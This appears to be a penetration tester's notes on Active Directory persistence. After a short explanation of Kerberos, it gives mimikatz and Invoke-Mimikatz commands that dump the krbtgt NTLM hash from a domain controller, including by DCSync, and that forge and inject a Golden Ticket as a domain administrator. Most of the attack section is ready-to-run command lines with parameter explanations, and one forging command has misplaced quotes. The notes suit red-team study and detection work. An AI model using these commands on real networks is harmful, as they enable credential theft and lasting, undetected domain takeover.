# Domain Persistance - Golden Ticket

Kerbros is basis of authentication in AD , it is being attacked since it was implemented with new attacks being discovered every year

## Steps in Kerberos

- User logs on with username & password.

- Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC (Key Distribution Centre also known as Domain Controller) as an authenticator in the authentication ticket (TGT) request  Authenitcation Service Request (AS-REQ).  The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).

- **The TGT is encrypted, signed, & delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.**

- The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum . If the DC can open the ticket & the checksum check out, `TGT = valid`. The data in the TGT is effectively copied to create the TGS ticket.

- The TGS is encrypted using the target service accounts’s NTLM password hash and sent to the user (TGS-REP)

- The user connects to the server hosting the service on the appropriate port & presents the TGS Application Request (AP-REQ). The service opens the TGS ticket using its NTLM password hash.

- Optional mutual authentication is done by service that the user provides TGS ticket to

## Golden Ticket

The TGT (Ticket Granting Ticket) that we obtain in the kerberos in the step where we request a TGS (Ticket Granting Service ) for a service that we want to connect ,it's a signed and encrypted by hash of `krbtgt` account 

Using golden tickets we can forge or create our own tickets to access other services (create TGT for services to request TGS for any service on any computer in domain)

To create a golden ticket we need 2 things , `krbtgt` account's password never changes and the account name is same in every domain and it's responsible for reading and signing TGT

- KRBTGT account password hash
- Domain name and SID 

## Using AD module

```
Import-Module activedirectory
Get-ADUser krbtgt
```

## Using mimikatz.exe

```
privilege::debug
lsadump:lsa /inject /name:krbtgt
```

After getting the `NTLM hash which used RC4 encryption`  and SID of krbtgt we can create a golden ticket for any user , can be an existing or a fake one , all is required is the 
- `/user` name (Arz) ,
- `/id` 500 which is deafult ID for Administrator user or any other id
- `/groups` we can leave it blank as the default group would be `Domain Admins`
- `/sid` insert SID of krbtgt user that we extracted earlier
- `/ptt` load the ticket in current powershell session 
- `/ticket` save the ticket on disk
 -`/startoffset:0` start the time of ticket , 0 means that ticket is created right now , -1 which would mean that it has been created in the past
 - `/endin:600` ticket liftime by default is 10 years , 600 means 600 minutes which is 10 hours
- `/renewmax:10080` ticket renewal , by defualt is 10 years , 10080 minutes is 7 days

The last 3 arguments are optional

```
kerberos:golden /domain: domain_name /sid:sid_of_krbtgt /rc4:krbtgt_hash /user:arz /id: 500 /ptt | /ticket

```

## Mimikatz Powershell

### Execute Mimikatz on DC as Domain Administrator to get krbtgt hash

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername computername
```

This will list all user's NTLM hashes

### When we have found krbtgt hash we can forge a TGT

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domainname /sid:sid_of_krbtgt /krbtgt:ntlm_hash_of_krbtgt" id:500 /groups /ptt"'
```

### DCSync feature for getting krbtgt hash 
If a user has DCSync rights (permission to replicated DC changes ) let's say `arz` can replicate DC changes

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:arz"'
```

Or 
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

